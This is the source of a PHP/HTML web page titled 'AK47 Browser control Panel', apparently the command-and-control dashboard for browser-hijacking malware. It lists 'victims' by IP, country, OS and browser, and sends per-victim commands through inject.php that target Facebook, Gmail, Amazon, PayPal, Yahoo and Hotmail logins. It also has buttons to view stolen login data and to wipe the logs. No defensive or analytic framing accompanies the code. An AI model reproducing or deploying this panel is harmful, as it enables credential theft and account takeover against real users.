<html lang="en">

<?php
    include_once 'sql.php';
    include 'index.php';
    //session_start();
?>

<head>
    <title>AK47 Browser control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="./jquery.js"></script>

</head>
<style>
    button {
        margin-top: 20px;
        line-height: 40px;
        font-weight: bold;
        padding: 0 40px;
        background: White;
        border: none;
    }

    button:hover {
        background: Grey;
    }

</style>

<body>
    <nav class="navbar navbar-inverse">
        <div class="container-fluid">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">AK47 Browser control Panel</a>
            </div>
            <div class="collapse navbar-collapse" id="myNavbar">
                <ul class="nav navbar-nav">
                    <li class="active"><a href="#">VICTIMS</a></li>
                    <li>Welcome <?php echo $_SESSION['username']; ?>!</li>
                </ul>
                <ul class="nav navbar-nav navbar-right">
                    <li><a href="logout.php"><span class="glyphicon glyphicon-log-in"></span> Logout</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <br>
    <div class="container-fluid">
        <div class="table-responsive">
            <table class="table table-hover">
                <tbody>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>IP</th>
                            <th>Country</th>
                            <th>OS</th>
                            <th>Browser</th>
                            <th>Browser version</th>
                        </tr>
                    </thead>
                </tbody>

            </table>
            <table class="table table-hover" id="showdata">
                <tbody>
                    <thead>
                        <tr>
                            <th></th>
                            <th></th>
                            <th></th>
                            <th></th>
                            <th></th>
                            <th></th>
                            <th></th>
                        </tr>
                    </thead>
                    <script>
                        $(document).ready(function() {
                            setInterval(function() {
                                $('#showdata').load('data.php')
                            }, 3000);
                        });

                    </script>
                </tbody>
            </table>
        </div>
    </div>
    <form class="container-fluid">
        <div class="container">
            <select name="command" class="container-fluid">
                <option value="DF">Select</option>
                <option value="FB">Facebook</option>
                <option value="GM">Gmail</option>
                <option value="AZ">Amazon</option>
                <option value="PL">Paypal</option>
                <option value="YH">Yahoo</option>
                <option value="HO">Hotmail or outlook</option>
            </select>

            <input id="ip" type="text" name="ip" value="ip:" class="container-fluid">
            <script>
                var button = document.createElement("button");
                button.innerHTML = "SHOW LOGIN DATA";

                var body = document.getElementsByTagName("body")[0];
                body.appendChild(button);

                button.addEventListener("click", function() {
                    window.open('showfetchdata.php', '_blank');
                });

            </script>
            <script>
                var button = document.createElement("button");
                button.innerHTML = "Clear all DATA";

                var body = document.getElementsByTagName("body")[0];
                body.appendChild(button);

                button.addEventListener("click", function() {
                    var req = new XMLHttpRequest();
                    req.open('GET', "clearalllog.php", false);
                    req.send(null);
                    if (req.status == 200) {
                        alert("All logs are Removed");
                    }
                    else
                    {
                        alert("failed to remove logs");
                    }
                });

            </script>
        </div>
    </form>
</body>
<script>
    $(document).ready(function() {
        $("select.container-fluid").change(function() {
            var code = $(this).children("option:selected").val();
            var ip = $("#ip").val();
            if (code == "DF") {
                console.log("Default");
            } else {
                var data = "?command=" + code + "&ip=" + ip;
                var req = new XMLHttpRequest();
                req.open('GET', "inject.php" + data, false);
                req.send(null);
                if (req.status == 200) {
                    alert("Command send successfully to " + ip);
                }
            }
        });
    });

</script>

</html>